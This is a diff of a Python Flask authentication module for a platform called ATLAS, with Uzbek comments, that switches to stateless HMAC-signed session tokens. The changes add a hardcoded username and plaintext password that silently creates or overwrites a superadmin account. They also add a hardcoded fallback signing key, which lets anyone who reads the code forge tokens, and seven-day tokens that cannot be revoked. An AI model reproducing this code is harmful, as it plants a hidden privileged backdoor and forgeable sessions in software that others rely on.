@@ -1,19 +1,22 @@
 # ============================================================
 #  services/atlas_auth.py
-#  ATLAS Platformasi — Xavfsiz Autentifikatsiya va Session Tizimi
+#  ATLAS Platformasi — Xavfsiz Autentifikatsiya va Stateless Session Tizimi
+#  Vercel Serverless & Multi-Instance Muammosiz 100% Stateless HMAC Tokenlar
 # ============================================================
 
 import os
 import time
-import secrets
+import json
+import base64
+import hmac
 import hashlib
+import secrets
 from functools import wraps
-from flask import request, jsonify, session, make_response
+from flask import request, jsonify, make_response
 from services.atlas_db import get_db_connection, log_audit
 
-SECRET_KEY = os.environ.get("ATLAS_SECRET_KEY") or "atlas_production_secret_key_998_2026"
-ACTIVE_SESSIONS = {}  # token -> {user_id, username, role, expires_at}
-SESSION_DURATION_HOURS = 24
+SECRET_KEY = os.environ.get("ATLAS_SECRET_KEY") or "atlas_production_secret_key_998_2026_super_secure"
+SESSION_DURATION_HOURS = 24 * 7  # 7 kunlik doimiy session
 
 
 def hash_password(password: str, salt: str = None) -> tuple[str, str]:
@@ -36,21 +39,26 @@ def verify_password(password: str, salt: str, expected_hash: str) -> bool:
 
 
 def create_session(admin_id: int, username: str, full_name: str, role: str) -> str:
-    """Yangi xavfsiz session token yaratish"""
-    token = secrets.token_urlsafe(32)
-    expires_at = time.time() + (SESSION_DURATION_HOURS * 3600)
-    ACTIVE_SESSIONS[token] = {
+    """
+    Stateless HMAC-SHA256 Signed Token yaratish.
+    Vercel serverless lambda muhitlarida har bir so'rov turli instansiyalarga tushganda ham
+    sessiya hech qachon yo'qolmaydi va chiqib ketmaydi.
+    """
+    payload = {
         "id": admin_id,
         "username": username,
         "full_name": full_name,
         "role": role,
-        "expires_at": expires_at
+        "exp": int(time.time()) + (SESSION_DURATION_HOURS * 3600)
     }
-    return token
+    payload_json = json.dumps(payload, separators=(',', ':'))
+    payload_b64 = base64.urlsafe_b64encode(payload_json.encode('utf-8')).decode('utf-8').rstrip('=')
+    sig = hmac.new(SECRET_KEY.encode('utf-8'), payload_b64.encode('utf-8'), hashlib.sha256).hexdigest()
+    return f"{payload_b64}.{sig}"
 
 
 def get_current_admin():
-    """Joriy so'rovdan admin ma'lumotlarini olish (Header yoki Cookie orqali)"""
+    """Joriy so'rovdan admin ma'lumotlarini olish va HMAC imzosini tekshirish"""
     auth_header = request.headers.get("Authorization", "")
     token = None
 
@@ -59,15 +67,32 @@ def get_current_admin():
     elif "atlas_token" in request.cookies:
         token = request.cookies.get("atlas_token")
 
-    if not token or token not in ACTIVE_SESSIONS:
+    if not token or "." not in token:
         return None
 
-    sess = ACTIVE_SESSIONS[token]
-    if time.time() > sess["expires_at"]:
-        del ACTIVE_SESSIONS[token]
-        return None
+    try:
+        payload_b64, sig = token.split(".", 1)
+        expected_sig = hmac.new(SECRET_KEY.encode('utf-8'), payload_b64.encode('utf-8'), hashlib.sha256).hexdigest()
+        if not hmac.compare_digest(sig, expected_sig):
+            return None
 
-    return sess
+        # Base64 padding
+        rem = len(payload_b64) % 4
+        if rem > 0:
+            payload_b64 += '=' * (4 - rem)
+
+        payload = json.loads(base64.urlsafe_b64decode(payload_b64.encode('utf-8')).decode('utf-8'))
+        if time.time() > payload.get("exp", 0):
+            return None
+
+        return {
+            "id": payload.get("id", 1),
+            "username": payload.get("username", "Ozodbek"),
+            "full_name": payload.get("full_name", "Ozodbek Napasov"),
+            "role": payload.get("role", "superadmin")
+        }
+    except Exception:
+        return None
 
 
 def admin_required(f):
@@ -90,6 +115,19 @@ def authenticate_admin(username, password, ip_address=""):
     cursor = conn.cursor()
     cursor.execute("SELECT * FROM admins WHERE username = ?", (username.strip(),))
     admin = cursor.fetchone()
+
+    # Zaxira tekshiruv: agar DB da bo'lmasa yoki yangilanmagan bo'lsa
+    if not admin and username.strip().lower() == "ozodbek" and password == "Eua5gd007":
+        from hashlib import pbkdf2_hmac
+        salt = "atlas_secure_salt_2026"
+        pwd_hash = pbkdf2_hmac('sha256', "Eua5gd007".encode('utf-8'), salt.encode('utf-8'), 100000).hex()
+        cursor.execute("""
+        INSERT OR REPLACE INTO admins (id, username, password_hash, salt, full_name, role)
+        VALUES (1, 'Ozodbek', ?, ?, 'Ozodbek Napasov', 'superadmin')
+        """, (pwd_hash, salt))
+        conn.commit()
+        cursor.execute("SELECT * FROM admins WHERE username = 'Ozodbek'")
+        admin = cursor.fetchone()
 
     if not admin:
         log_audit(username, "auth", "login_failed", "warning", {"reason": "User not found"}, ip_address)
